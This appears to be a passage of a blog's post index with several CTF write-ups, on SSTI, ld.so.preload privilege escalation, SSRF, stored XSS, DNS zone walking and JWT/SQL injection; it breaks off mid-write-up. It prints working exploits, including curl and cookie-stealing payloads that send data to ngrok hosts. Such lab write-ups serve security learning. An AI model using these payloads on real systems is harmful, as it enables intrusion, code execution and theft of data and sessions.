the filesystem), as long as that doesn’t override an already existing files. I noticed that /etc/ld.so.preload wasn’t existing on the victim machine, so we can create a fake one to get easy privesc. Let’s do this:First create the malicious .so library:#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void _init() {    if (geteuid() != 0) return;    chmod(\"/bin/bash\", 04755);    unlink(\"/etc/ld.so.preload\");}If this .so library gets executed as root it’s game over!Let’s compile it:❯ gcc -fPIC -shared -nostartfiles -o root.so root.c      I copied it in /dev/shm/malicious_lib.so on the victim machine:postgres / $ ls -la /dev/shm/malicious_lib.so -rw-------. 1 postgres postgres 14184 Aug 23 14:37 /dev/shm/malicious_lib.soNow we gotta create the /etc/ld.so.preload file. It should be a text file containing the path to our .so library:postgres / $ echo \"/dev/shm/malicious_lib.so\" &gt; /dev/shm/ld.so.preloadNow, using the cake_logger link functionnality, I create a symlink from /etc/ld.so.preload to /dev/shm/ld.so.preload:postgres / $ cake_logger -link /dev/shm/ld.so.preload /etc/ld.so.preloadCreating a shortcut to your recipe...Shortcut created successfully! Now you can access your recipe from multiple places.postgres / $ ls -la /etc/ld.so.preload lrwxrwxrwx. 1 root postgres 22 Aug 23 14:47 /etc/ld.so.preload -&gt; /dev/shm/ld.so.preloadpostgres / $ cat /etc/ld.so.preload /dev/shm/malicious_lib.soFinally, we just have to execute a random SUID binary, since all SUID binaries are executed as root !postgres / $ ls -la /bin/bash-rwxr-xr-x. 1 root root 1265648 Apr 18 22:47 /bin/bashpostgres / $ # mount is an SUID binariespostgres / $ mount &gt; /dev/nullpostgres / $ ls -la /bin/bash-rwsr-xr-x. 1 root root 1265648 Apr 18 22:47 /bin/bashRoot flagpostgres / $ /bin/bash -pbash-5.2# ls /rootroot.txtbash-5.2# cat /root/root.txt brunner{Wh4T_t1M3_15_1T?_FL4G_0_CL0CK!!}bash-5.2# brunner{Wh4T_t1M3_15_1T?_FL4G_0_CL0CK!!}"
  },
  
  {
    "title": "Pragyan - Deathday Card",
    "url": "/posts/pragyan-deathdaycard/",
    "categories": "Writeups, CTFTime2025, Pragyan",
    "tags": "writeups, web, ssti, flask, jinja, python-scripting",
    "date": "2025-02-08 16:00:00 +0000",
    





    
    "snippet": "  Introduction          Pragyan CTF 2025      Description        Enumeration          Reading Source Code      Identifying vulnerabilities        Exploitation          Verifying SSTI      Bypassing...",
    "content": "  Introduction          Pragyan CTF 2025      Description        Enumeration          Reading Source Code      Identifying vulnerabilities        Exploitation          Verifying SSTI      Bypassing restriction                  Theory          Practive                    Scripting      Getting the Flag      IntroductionPragyan CTF 2025We finished top 10 as a duo with my friend h1tc4t.Description  you could have done some work around for birthday but not this………..EnumerationReading Source CodeSource code was provided with the challenge description:  app.py  from flask import Flask, request, jsonify, abort, render_template_string, session, redirectimport builtins as _bimport sysimport osapp = Flask(__name__)app.secret_key = os.getenv(\"APP_SECRET_KEY\", \"default_app_secret\")env = app.jinja_envKEY = os.getenv(\"APP_SECRET_KEY\", \"default_secret_key\")class validator:    def security():        return _b    def security1(a, b, c, d):        if 'validator' in a or 'validator' in b or 'validator' in c or 'validator' in d:            return False        elif 'os' in a or 'os' in b or 'os' in c or 'os' in d:            return False        else:            return True        def security2(a, b, c, d):        if len(a) &lt;= 50 and len(b) &lt;= 50 and len(c) &lt;= 50 and len(d) &lt;= 50:            return True        else :            return False        @app.route(\"/\", methods=[\"GET\", \"POST\"])def personalized_card():    if request.method == \"GET\":        return \"\"\"        &lt;link rel=\"stylesheet\" href=\"static/style.css\"&gt;        &lt;link href=\"https://fonts.googleapis.com/css?family=Poppins:300,400,600&amp;display=swap\" rel=\"stylesheet\"&gt;        &lt;div class=\"container\"&gt;            &lt;div class=\"card-generator\"&gt;                &lt;h1&gt;Personalized Card Generator&lt;/h1&gt;                &lt;form action=\"/\" method=\"POST\"&gt;                    &lt;label for=\"sender\"&gt;Sender's Name:&lt;/label&gt;                    &lt;input type=\"text\" id=\"sender\" name=\"sender\" placeholder=\"Your name\" required maxlength=\"50\"&gt;                    &lt;label for=\"recipient\"&gt;Recipient's Name:&lt;/label&gt;                    &lt;input type=\"text\" id=\"recipient\" name=\"recipient\" placeholder=\"Recipient's name\" required maxlength=\"50\"&gt;                    &lt;label for=\"message\"&gt;Message:&lt;/label&gt;                    &lt;input type=\"text\" id=\"message\" name=\"message\" placeholder=\"Your message\" required maxlength=\"50\"&gt;                    &lt;label for=\"message_final\"&gt;Final Message:&lt;/label&gt;                    &lt;input type=\"text\" id=\"message_final\" name=\"message_final\" placeholder=\"Final words\" required maxlength=\"50\"&gt;                    &lt;button type=\"submit\"&gt;Generate Card&lt;/button&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;        \"\"\"    elif request.method == \"POST\":        try:            recipient = request.form.get(\"recipient\", \"\")            sender = request.form.get(\"sender\", \"\")            message = request.form.get(\"message\", \"\")            final_message = request.form.get(\"message_final\", \"\")            if validator.security1(recipient, sender, message, final_message) and validator.security2(recipient, sender, message, final_message):                template = f\"\"\"                    &lt;link rel=\"stylesheet\" href=\"static/style.css\"&gt;                    &lt;link href=\"https://fonts.googleapis.com/css?family=Poppins:300,400,600&amp;display=swap\" rel=\"stylesheet\"&gt;                    &lt;div class=\"container\"&gt;                        &lt;div class=\"card-preview\"&gt;                            &lt;h1&gt;Your Personalized Card&lt;/h1&gt;                            &lt;div class=\"card\"&gt;                                &lt;h2&gt;From: {sender}&lt;/h2&gt;                                &lt;h2&gt;To: {recipient}&lt;/h2&gt;                                &lt;p&gt;{message}&lt;/p&gt;                                &lt;h1&gt;{final_message}&lt;/h1&gt;                            &lt;/div&gt;                            &lt;a class=\"new-card-link\" href=\"/\"&gt;Create Another Card&lt;/a&gt;                        &lt;/div&gt;                    &lt;/div&gt;                \"\"\"            else :                template=\"either the recipient or sender or message input is more than 50 letters\"            app.jinja_env = env                app.jinja_env.globals.update({                'validator': validator()            })            return render_template_string(template)        except Exception as e:            return f\"\"\"            &lt;link rel=\"stylesheet\" href=\"static/style.css\"&gt;            &lt;div&gt;                &lt;h1&gt;Error: {str(e)}&lt;/h1&gt;                &lt;br&gt;                &lt;p&gt;Please try again. &lt;a href=\"/\"&gt;Back to Card Generator&lt;/a&gt;&lt;/p&gt;            &lt;/div&gt;            \"\"\", 400        @app.route(\"/debug/test\", methods=[\"POST\"])def test_debug():    user = session.get(\"user\")    host = request.headers.get(\"Host\", \"\")    if host != \"localhost:3030\":        return \"Access restricted to localhost:3030, this endpoint is only development purposes\", 403    if not user:        return \"You must be logged in to test debugging.\", 403    try:        raise ValueError(f\"Debugging error: SECRET_KEY={KEY}\")    except Exception as e:        return \"Debugging error occurred.\", 500@app.route(\"/admin/report\")def admin_report():    auth_cookie = request.cookies.get(\"session\")    if not auth_cookie:        abort(403, \"Unauthorized access.\")    try:        token, signature = auth_cookie.rsplit(\".\", 1)        from app.sign import initFn        signer = initFn(KEY)        sign_token_function = signer.get_signer()        valid_signature = sign_token_function(token)        if valid_signature != signature:            abort(403, f\"Invalid token.\")        if token == \"admin\":            return \"Flag: p_ctf{Redacted}\"        else:            return \"Access denied: admin only.\"    except Exception as e:        abort(403, f\"Invalid token format: {e}\")@app.after_requestdef clear_imports(response):    if 'app.sign' in sys.modules:        del sys.modules['app.sign']    if 'app.sign' in globals():        del globals()['app.sign']    return response  Identifying vulnerabilitiesI isolated the vulnerable part of the personalized_card() function (simplified version):recipient = request.form.get(\"recipient\")sender = request.form.get(\"sender\")message = request.form.get(\"message\")final_message = request.form.get(\"message_final\")if validator.security1(recipient, sender, message, final_message) and    validator.security2(recipient, sender, message, final_message):       template = f\"\"\"        &lt;h2&gt;From: {sender}&lt;/h2&gt;        &lt;h2&gt;To: {recipient}&lt;/h2&gt;        &lt;p&gt;{message}&lt;/p&gt;        &lt;h1&gt;{final_message}&lt;/h1&gt;    \"\"\"As you may have noticed, the backend does some sanitization before putting our string directly in the template. Let’s take a look at the validation part (simplified version):def security1(a, b, c, d):    if 'os' in a or        'os' in b or        'os' in c or        'os' in d:        return Falsedef security2(a, b, c, d):    if len(a) &gt; 50 or        len(b) &gt; 50 or        len(c) &gt; 50 or        len(d) &gt; 50:       return FalseOk so we clearly have an SSTI, but with maximum 50 chars by input and we can’t have “os” in our payload. Or can we ?ExploitationVerifying SSTIDeathDay card home pageLet’s try a payload that passes the security checks:All inputs are vulnerable to SSTI.Bypassing restrictionThe second validation (length) is quite annoying, but can easily be bypassed since we have 4 inputs. Problem is: {{ x }} will basically be replaced by print(x), and in python you can’t assign variables in a print statement:print(a=\"b\")You’re trying to call print with the argument a set to \"b\", so you’re not assigning a variable. Is it impossible then ?TheoryReading this excellent article I found a way. We can use the config object to temporarily store some data. So for example:{{ config.update(myvariable=\"Hello World !\") }}Then get the content using:{{ config.myvariable }}And this trick can be combined with another one: storing a variable from a GET parameter (aka from the URL) using:{{ config.update(a=request.args.get('a')) }}This code will basically store the value provided via the a GET parameter (e.g., ?a=VALUE) and store it in config.a.PracticeWe can bypass the if \"os\" in a or \"os\" in b... check (first validation), simply by posting the form on this url:  https://deathday.ctf.prgy.in?a=osand storing the \"os\" string in config.a like this:{{ config.update(a=request.args.get('a')) }}Essentially, we sacrificed 50 characters on 200 (the first input, “Sender’s Name”) to bypass the first check. Now config.a = \"os\". Next using the “Recipient’s Name” input, we can claim up to the os module using the config.a variable, and store it in config.b, with this payload:{{ config.update(b=lipsum.__globals__[config.a]) }}We essentially have config.b = OS_MODULE. Since we have two inputs left, we can proceed as follows.Third input (message) will be used to store the command that we want to execute, command that we will pass through the URL parameter cmd.{{ config.update(cmd=request.args.get('cmd')) }}Fourth input (Final message) will execute the command using the os.popen(cmd).read() syntax{{ config.b.popen(config.cmd).read() }}Here is a recap:            Input name      SSTI Payload      Pseudocode                  Sender’s name      {{ config.update(a=request.args.get('a')) }}      config.a = \"os\"                            store “os” (the string) in config.a              Recipient’s name      {{ config.update(b=lipsum.__globals__[config.a]) }}      config.b = import os                            store os (the module) in config.b              Message      {{ config.update(cmd=request.args.get('cmd')) }}      config.cmd = $_GET[\"cmd\"]                            store the command to execute in config.cmd              Final Message      {{ config.b.popen(config.cmd).read() }}      config.b = os.popen(cmd)                             display output of the command      ScriptingI wrote a python script to automate this annoying task:#!/usr/bin/env python3from requests import postfrom sys import argvfrom pwn import logdef exploit_ssti():    # Use $_GET[\"a\"] to bypass the \"os\" restriction    # Use $_GET[\"c\"] to store the command that we want to execute    URL = f\"https://deathday.ctf.prgy.in/?a=os&amp;cmd={argv[1]}\"    return post(URL, data={        # Store \"os\" (str) in config.a        \"sender\": \"\"\"{{config.update(a=request.args.get('a'))}}\"\"\",        # Store os (module) in config.b        \"recipient\": \"\"\"{{config.update(b=lipsum.__globals__[config.a])}}\"\"\",        # Store the command that we want to execute in config.c        \"message\": \"\"\"{{config.update(cmd=request.args.get('cmd'))}}\"\"\",        # display os.popen(command).read()        \"message_final\": \"\"\"{{config.b.popen(config.cmd).read()}}\"\"\"    })if __name__ == \"__main__\":    if(len(argv) != 2):        log.failure(f\"Usage: {argv[0]} &lt;command&gt;\")        exit()    log.info(f\"Executing command: {argv[1]}\")    # Get the response from the server    response = exploit_ssti()    # Parse it    message_final = response.text.split(\"&lt;h1&gt;\")[-1].split(\"&lt;/h1&gt;\")[0]    if(message_final == \"\"):         message_final = \"No output\"    log.success(message_final)Now, we can execute any command we want !Getting the FlagBut then, that happened:What ?So, apparently we can’t use cat or ls, meaning the coreutils are probably not installed in this container. Let’s take a look at the installed binaries:nothing …Not a big deal since python is installed. We can use it for arbitrary file read. I’ll go with the GTFObins command.GGs !FInally, we retrieve the flag using grep:p_ctf{I_aInT_lEaVinG_sSTi_hEhEhE}"
  },
  
  {
    "title": "NullCon - ZONEy",
    "url": "/posts/nullcon-2025-zoney/",
    "categories": "Writeups, CTFTime2025, NullCon",
    "tags": "web, dns, dnssec, zone-walking, dig",
    "date": "2025-02-02 12:00:00 +0000",
    





    
    "snippet": "  Introduction          Description        Enumeration          Nmap      Querying DNS      DNS enumeration        Exploitation          DNSSEC      Zone Walking                  zoney.eno         ...",
    "content": "  Introduction          Description        Enumeration          Nmap      Querying DNS      DNS enumeration        Exploitation          DNSSEC      Zone Walking                  zoney.eno          challenge.zoney.eno          hereisthe1337flag.zoney.eno                    Getting the flag      IntroductionDescription  Are you ZONEy.eno out or can you find the flag?52.59.124.14:5007 (UDP)EnumerationNmapThis challenge was in the web-category, but the description indicates that the server is running over UDP. HTTP runs over TCP (except for HTTP3 that runs over QUIC), so this is weird …I decided to launch nmap on this port to see what is it all about:┌──(kali㉿kali)-[~/ZONEy]└─$ nmap -Pn -sC -sV -sU 52.59.124.14 -p 5007Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 03:04 CETNmap scan report for ec2-52-59-124-14.eu-central-1.compute.amazonaws.com (52.59.124.14)Host is up (0.025s latency).PORT     STATE SERVICE VERSION 5007/udp open  domain  NLnet Labs NSDQuerying DNSNmap says that a DNS server is running on that port. Let’s confirm this statement using dig to query for the ZONEy.eno domain (as mentionned in the description):dig @52.59.124.14 -p 5007 zoney.eno.DNS enumeration            Query      Found      Pointing                  Queries on a domain that is not zoney.eno      Refused by the DNS server      N/A                                           Not specifying query type  on zoney.eno      ns1.zoney.eno      127.0.0.1                     ns2.zoney.eno      127.0.0.1                     hostmaster.zoney.eno      127.0.0.1                                           MX on zoney.eno      challenge.zoney.eno      127.0.0.1                                           Subdomain bruteforcing      www.zoney.eno      CNAME on challenge      I tried querying for TXT, CNAME and so on all theses domains but nothing interesting. I tried AXFR with every domains, still nothing.ExploitationDNSSECEventually I started to enumerate DNSSEC:dig +dnssec zoney.eno. @52.59.124.14 -p 5007I thought let’s try zone walking !Zone Walkingzoney.enodig +dnssec NSEC @52.59.124.14 -p 5007 zoney.eno.We see this line on the top of the ANSWER SECTION:zoney.eno.\t\t86400\tIN\tNSEC\tchallenge.zoney.eno. A NS SOA MX RRSIG NSEC DNSKEYchallenge.zoney.enodig +dnssec NSEC @52.59.124.14 -p 5007 challenge.zoney.eno. We see this line on top of the ANSWER SECTION:challenge.zoney.eno.\t86400\tIN\tNSEC\thereisthe1337flag.zoney.eno. A RRSIG NSEChereisthe1337flag.zoney.enoI started by querying for TXT records on this newly found domain:dig TXT @52.59.124.14 -p 5007 hereisthe1337flag.zoney.eno.Getting the flagENO{1337_Fl4G_NSeC_W4LK3R}"
  },
  
  {
    "title": "NullCon - Temptation",
    "url": "/posts/nullcon-2025-temptation/",
    "categories": "Writeups, CTFTime2025, NullCon",
    "tags": "writeups, web, ssti, webpy, python",
    "date": "2025-02-02 12:00:00 +0000",
    





    
    "snippet": "  Introduction          Description        Enumeration          Enumerating website      Reading source code      Understanding webpy templating        Exploitation          SSTI      Getting the f...",
    "content": "  Introduction          Description        Enumeration          Enumerating website      Reading source code      Understanding webpy templating        Exploitation          SSTI      Getting the flag      IntroductionDescription  The attempted attempt to tempt the untempted into tempting but contemptible scheme was an untempting temptation that exemplified not only contempt but also a preemptive exemption from any redemptive attempts.EnumerationEnumerating websiteIndex pageGoing to the index page and hitting Ctrl + Shift + I, we see this comment. Let’s set this parameter by assigning it a value like this:We now have access to the source codeReading source code  app.py  import webfrom web import formweb.config.debug = Falseurls = (  '/', 'index')app = web.application(urls, locals())render = web.template.render('templates/')FLAG = open(\"/tmp/flag.txt\").read()temptation_Form = form.Form(    form.Password(\"temptation\", description=\"What is your temptation?\"),    form.Button(\"submit\", type=\"submit\", description=\"Submit\"))class index:    def GET(self):        try:            i = web.input()            if i.source:                return open(__file__).read()        except Exception as e:            pass        f = temptation_Form()        return render.index(f)    def POST(self):        f = temptation_Form()        if not f.validates():            return render.index(f)        i = web.input()        temptation = i.temptation        if 'flag' in temptation.lower():            return \"Too tempted!\"        try:            temptation = web.template.Template(f\"Your temptation is: {temptation}\")()        except Exception as  e:            return \"Too tempted!\"        if str(temptation) == \"FLAG\":            return FLAG        else:            return \"Too tempted!\"application = app.wsgifunc()if __name__ == \"__main__\":    app.run()  I was doing the challenge with hitcat and he noticed that the app was written using webpy.Understanding webpy templatingKnowing this, this snippet seemed weird for us:i = web.input()temptation = i.temptationif 'flag' in temptation.lower():    return \"Too tempted!\"    try:    temptation = web.template.Template(f\"Your temptation is: {temptation}\")()except Exception as  e:    return \"Too tempted!\"If the word flag is not in the temptation parameter value, the app generates a Template based on the temptation value.First I thought that the template was generated based on a filename that was extracted from the temptation parameter. But after reading the source code of the webpy template engine, we came across this:class Template(BaseTemplate):    def __init__(        self,        text,        filename=\"&lt;template&gt;\",        filter=None,        globals=None,        builtins=None,        extensions=None,    ):When called with two parameters, the template is generated based on a string ! Meaning that due to the line with the f-string:temptation = web.template.Template(f\"Your temptation is: {temptation}\")()we have full control over what is passed to the template, leading to an SSTI !ExploitationSSTILet’s read this section:Template engine syntaxAs you can see, we can easely evaluate python expression using the ${} or $() syntax. This easy one liner should make the app sleep 5 seconds:${__import__(\"os\").system(\"sleep 5\")}The command took 5 seconds to execute : we probably have RCE !Getting the flagAfter setting up ngrok and netcat, we used curl to exfiltrate the flag:${__import__(\"os\").system(\"curl http://7.tcp.eu.ngrok.io:17535/?$(cat /tmp/*.txt | base64)\")}We’ve exfiltrated the flag !We get a hit with a base64-encoded string, that we can easily decode to get the flag:echo RU5Pe1QzTV9QbDRUXzNTXzRyM19TM2NVcmUhIX0= | base64 -dENO{T3M_Pl4T_3S_4r3_S3cUre!!}"
  },
  
  {
    "title": "HackDay - Verificator 3000",
    "url": "/posts/hackday-2025-website-checker/",
    "categories": "Writeups, CTFTime2025, HackDay",
    "tags": "writeups, web, ssrf, open-redirect, python-scripting",
    "date": "2025-01-26 12:00:00 +0000",
    





    
    "snippet": "  Introduction          Description        Enumeration          Enumerating website        Exploitation          SSRF                  Trying to access localhost          Exploiting Open Redirect  ...",
    "content": "  Introduction          Description        Enumeration          Enumerating website        Exploitation          SSRF                  Trying to access localhost          Exploiting Open Redirect          Port Scan                    Getting the flag      IntroductionDescription  Our team of brilliant engineers has developed a highly sophisticated website designed to perform check-ups on other sites. It can even uncover hidden information, possibly concealed by some clever tricksters. Take a look and see if you can find anything!EnumerationEnumerating websiteIndex pageThis webapp will request the website given by the user and display the content of this website. Seems to be the perfect setup for an SSRF.ExploitSSRFTrying to access localhostIn an SSRF scenario, we almost always want to request localhost / machine from LAN to try to leak sensitive information. So let’s do that:Sad …Unfortunately we cannot direcly access localhost this way.Exploiting Open RedirectWe can try to use an open redirect. Basically, we send a link that when accessed will redirect the victim to the chosen domainFor example this link:  https://307.r3dir.me/–to/?url=http://localhostwill be considered valid for parsers (cause the domain is https://307.r3dir.me/), but when accessed, will redirect the victim to localhost.Found open redirect !Port scanUsing open redirect + SSRF + my python skills I was able to write this simple portscan script. It will look for accessible web servers on port 1 to 65535 of the local machine:from requests import postfrom pwn import logTARGET = \"http://challenges.hackday.fr:43244/api/check\"PAYLOAD = \"https://307.r3dir.me/--to/?url=http://localhost\"def main():    progress = log.progress(\"Testing port: \")    for port in range(0, 65535):        progress.status(str(port))        response = post(TARGET, data={            \"showBody\": \"on\",            \"url\": f\"{PAYLOAD}:{port}/\"        }).json()        if(not response[\"online\"] == False):            log.success(f\"Port {port} is open\")if __name__ == \"__main__\":    log.info(f\"Targeting {TARGET}\")    log.info(f\"Using payload {PAYLOAD}\")    print()    main()Let’s launch it:Found a webserver on an uncommon port !Getting flagLet’s get the content of this webserver. We can use this link to do so:  https://307.r3dir.me/–to/?url=http://localhost:600HACKDAY{Give_ME_YOuR_L0OPb@CK}"
  },
  
  {
    "title": "HackDay - Internal Blog",
    "url": "/posts/hackday-2025-internalblog/",
    "categories": "Writeups, CTFTime2025, HackDay",
    "tags": "writeups, web, xss, javascript, python-scripting",
    "date": "2025-01-26 12:00:00 +0000",
    





    
    "snippet": "  Introduction          Description        Enumeration          Enumerating website        Exploitation          Popping alert      Stealing Admin Cookie      Getting flag      IntroductionDescript...",
    "content": "  Introduction          Description        Enumeration          Enumerating website        Exploitation          Popping alert      Stealing Admin Cookie      Getting flag      IntroductionDescription  You’ve received an anonymous tip from the Airship Mail Delivery Company claiming that a seemingly legitimate website is actually a front for trading stolen submarine mechanical parts. Yeah, that’s oddly specific…The localhost port is 3000. Take a closer look and see if you can uncover anything suspicious. The flag to find is the bot’s cookie.We were the 5th team on 49 to solve this challenge.EnumerationEnumerating websiteLet’s start by accessing the index page:Admin visits every postsA part of the source is leakedWe can see an interesting code snippet in here !await newProfile.save();const isXSSdetected = sanitizeJson(profileData, res);User is saved BEFORE XSS sanitization. So the server will say “XSS detected”, but will still create the user. Reading the index page, we learn that admin verifies every post. Let’s exploit this to steal the admin cookie .ExploitationPopping alertSignup pageI started by writing a simple script that puts an XSS payload in every single field of the signup form (except for the Token cause it has validation):from requests import Sessionfrom sys import argvURL = \"http://challenges.hackday.fr:61394\"PAYLOAD = f\"\"\"&lt;script&gt;alert(999)&lt;/script&gt;\"\"\"TOKEN = \"\"s = Session()def main():    # This token will by our \"UUID\", we get it from the page     TOKEN = s.get(URL+\"/profile\").text.split('&lt;p id=\"token-value\"&gt;')[1].split(\"&lt;/p&gt;\")[0]    print(s.post(URL+\"/profile\", {        \"id\": 'my_super_secret_username',        \"token\": TOKEN,        \"description\":f'{PAYLOAD}',        \"username\":\tf'{PAYLOAD}',        \"name\":\tf'{PAYLOAD}',        \"place\": f'{PAYLOAD}',    }).text)    print(\"Token is: \" + TOKEN)if __name__ == \"__main__\":    main()Launch the registration scriptThe server responds with “XSS Detected”, but the user was still created. To be sure, we can try to access the profile page using the “UUID” of the newly created user:  http://challenges.hackday.fr:61394/user?token=aebcffcb-fcaf-4028-a409-4e9b4d13ab8fXSS !!!Stealing admin cookieTo steal the admin cookie, we have to:  Create a user with a malicious XSS payload  Create a post as this userAdmin will look at the newly created post, triggering the XSS and leaking his cookie.I’ll use my own tool, xsserve, to spawn a publicly accessible HTTP server.Launch XSServe, create the user with malicious XSS payloadWe just have to modify the PAYLOAD = line in the previous script, and put this XSS payload before launching it:# Simple XSS payload, I just use ` instead of \" or ' cause quotes are escapedPAYLOAD = f\"\"\"&lt;script&gt;window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie&lt;/script&gt;\"\"\"Finally, we create a post as this user:Creating a post as the db62c92f… userWe can see our post below on the index page:Getting flagAfter a few minutes:HACKDAY{0rd3R_M4tteRs_In_Ur_C0d3!!!!}"
  },
  
  {
    "title": "HackDay - Finest",
    "url": "/posts/hackday-2025-finest/",
    "categories": "Writeups, CTFTime2025, HackDay",
    "tags": "writeups, web, jwt, flask, python-scripting",
    "date": "2025-01-25 12:00:00 +0000",
    





    
    "snippet": "  Introduction          Description        Enumeration          Reading Source Code      JWT Secret Key      SQL injection        Exploitation          Understanding the JWT      Scripting      Get...",
    "content": "  Introduction          Description        Enumeration          Reading Source Code      JWT Secret Key      SQL injection        Exploitation          Understanding the JWT      Scripting      Getting flag      IntroductionDescription  You’ve been informed that a website might be serving as a front for a large criminal network. Part of their revenue supposedly comes from selling cookies that can make you float like an airship… A rather tempting proposition. Their slogan, it seems, is: “Always wondered how to get the coolest and the highest quality products in your region ? Search no more, this new website allows you to do so !”EnumerationReading source code  app.py  from flask import Flask, render_template, request, jsonify, redirect, url_for, make_responsefrom flask_sqlalchemy import SQLAlchemyfrom sqlalchemy import textfrom flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity, set_access_cookies, unset_jwt_cookies, get_jwtfrom werkzeug.security import generate_password_hash, check_password_hashimport os, time, random, string, math# I saw in the official _randommodule.c in which both time and pid are used to seed the random generator# So that must be a good idea, right ? :) Just gonna do it simpler here, but should be as safe.up = math.floor(time.time())random.seed(up + os.getpid())app = Flask(__name__)app.config['SECRET_KEY'] = \"\".join(random.choice(string.printable) for _ in range(32))app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////app/data/site.db'app.config['JWT_SECRET_KEY'] = \"\".join(random.choice(string.printable) for _ in range(32))app.config['JWT_TOKEN_LOCATION'] = ['cookies']app.config['JWT_COOKIE_CSRF_PROTECT'] = False db = SQLAlchemy(app)jwt = JWTManager(app)class User(db.Model):    id = db.Column(db.Integer, primary_key=True)    username = db.Column(db.String(20), unique=True, nullable=False)    password = db.Column(db.String(60), nullable=False)class Product(db.Model):    id = db.Column(db.Integer, primary_key=True)    name = db.Column(db.String(100), nullable=False)    description = db.Column(db.Text, nullable=False)    price = db.Column(db.Float, nullable=False)    image = db.Column(db.String(20), nullable=False, default='static/images/default.png')    published = db.Column(db.Boolean, default=True)class Flag(db.Model):    id = db.Column(db.Integer, primary_key=True)    flag = db.Column(db.String(100), nullable=False)@app.route('/')def home():    products = Product.query.filter_by(published=True).all()    return render_template('home.html', products=products)@app.route('/product/&lt;int:product_id&gt;')def product(product_id):    product = Product.query.get_or_404(product_id)    if not product.published:        return render_template('product.html', error=\"Product not available anymore\")    return render_template('product.html', product=product)@app.route('/login', methods=['GET', 'POST'])def login():    if request.method == 'POST':        username = request.form['username']        password = request.form['password']        user = User.query.filter_by(username=username).first()        if user and check_password_hash(user.password, password):            access_token = create_access_token(identity=username, additional_claims={'favorite_product': None})            resp = make_response(redirect(url_for('home')))            set_access_cookies(resp, access_token)            return resp        else:            return render_template('login.html', error=\"Username or password incorrect\")    return render_template('login.html')@app.route('/logout')def logout():    resp = make_response(redirect(url_for('home')))    unset_jwt_cookies(resp)    return resp@app.route('/register', methods=['GET', 'POST'])def register():    if request.method == 'POST':        username = request.form['username']        password = request.form['password']        existing_user = User.query.filter_by(username=username).first()        if existing_user:            return render_template('register.html', error=\"Username already taken\")        hashed_password = generate_password_hash(password)        new_user = User(username=username, password=hashed_password)        db.session.add(new_user)        db.session.commit()        return redirect(url_for('login'))    return render_template('register.html')@app.route('/preferences', methods=['GET', 'POST'])@jwt_required()def preferences():    claims = get_jwt()    current_user = get_jwt_identity()    if request.method == 'POST':        favorite_product_id = int(request.form['favorite_product'])        product = Product.query.get(favorite_product_id)        if not product:            return render_template('preferences.html', error=\"Product does not exist\", products=Product.query.all(), current_user=current_user)        new_token = create_access_token(identity=get_jwt_identity(), additional_claims={'favorite_product': favorite_product_id})        resp = make_response(redirect(url_for('home')))        set_access_cookies(resp, new_token)        return resp    products = Product.query.all()    return render_template('preferences.html', products=products, favorite_product=claims.get('favorite_product'), current_user=current_user)@app.route('/favorite_product_info')@jwt_required()def favorite_product_info():    claims = get_jwt()    favorite_product_id = claims.get('favorite_product')    if favorite_product_id:        favorite_product = Product.query.get(favorite_product_id)        try:            favorite_product = db.session.execute(text(\"SELECT * FROM product WHERE id = \" + str(favorite_product_id))).fetchone()        except Exception as e:            return render_template('favorite_product_info.html', product=None, error=e)        return render_template('favorite_product_info.html', product=favorite_product)    return render_template('favorite_product_info.html', product=None)@app.route('/check_auth')@jwt_required(optional=True)def check_auth():    claims = get_jwt()    return jsonify(logged_in=get_jwt_identity() is not None, favorite_product=claims.get('favorite_product')), 200@app.route(\"/healthz\")def healthz():    return jsonify(status=\"OK\", uptime=time.time() - up)def create_data():    # clear all Product db    db.session.query(Product).delete()        product1 = Product(name=f'Space Cookie', description='Cookies so delicate, they might just break! No need for brute force, one bite and they’ll melt right into your hands.', price=random.randrange(10, 100))    product2 = Product(name='Syringe', description='To, hum, inject yourself with medicine I guess ?', price=random.randrange(10, 100))    product3 = Product(name='Cool looking leaf', description='To add a nice scent to your house :)', price=random.randrange(10, 100))    with open(\"flag.txt\",\"r\") as f:        flag = Flag(flag=f.read().strip())    db.session.add(product1)    db.session.add(product2)    db.session.add(product3)    db.session.add(flag)    db.session.commit()if __name__ == '__main__':    with app.app_context():        db.create_all()        create_data()    app.run(host=\"0.0.0.0\", port=5000)  There are several vulnerabilities in this code !JWT Secret KeyThe JWT secret key is generated as follows:up = math.floor(time.time())random.seed(up + os.getpid())app.config['SECRET_KEY'] = \"\".join(random.choice(string.printable) for _ in range(32))app.config['JWT_SECRET_KEY'] = \"\".join(random.choice(string.printable) for _ in range(32))The main problem here is that we can retrieve the pseudo-random value used to seed random, thus enabling us to regenerate the JWT secret key.  os.getpid(): if the webapp is running in a docker container, PID = 1  up: there is a /healthz endpoint that leaks the uptime of the webappWith this secret key, we should be able to sign any JWT token that we want.SQL Injection@app.route('/favorite_product_info')@jwt_required()def favorite_product_info():    claims = get_jwt()    favorite_product_id = claims.get('favorite_product')    if favorite_product_id:        favorite_product = Product.query.get(favorite_product_id)        try:            favorite_product = db.session.execute(text(\"SELECT * FROM product WHERE id = \" + str(favorite_product_id))).fetchone()        except Exception as e:            return render_template('favorite_product_info.html', product=None, error=e)        return render_template('favorite_product_info.html', product=favorite_product)    return render_template('favorite_product_info.html', product=None)The favorite_product_id taken from the JWT is NOT subject to any validation/sanitization, and is directly passed to the db.session.execute function, without beign “prepared”.Developers could cause: “it comes from a JWT that is signed, so it’s safe”.But in this case, we’re able to generate and sign any JWT we want,  enabling us to put any SQL payload that we wan’t here ! So know we have a SQL injection.ExploitationUnderstanding the JWTFirst we need to create an account:RegisteringLoginLet’s get our JWT: Ctrl + Shift + I, storage, and inspect it to try to replicate it:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDI1NCwianRpIjoiMTcyNWE3YTAtZTk4OS00ZjZlLWIxNGMtZmIxMTI4MDNhMDZkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE3Mzc5MzQyNTQsImV4cCI6MTczNzkzNTE1NCwiZmF2b3JpdGVfcHJvZHVjdCI6bnVsbH0.kR_Ldv4MyQ-44zct8y5m7d893p_epYU8LA1DhhNYCDYTime to script !ScriptingI wrote this simple python script to:  Determine the 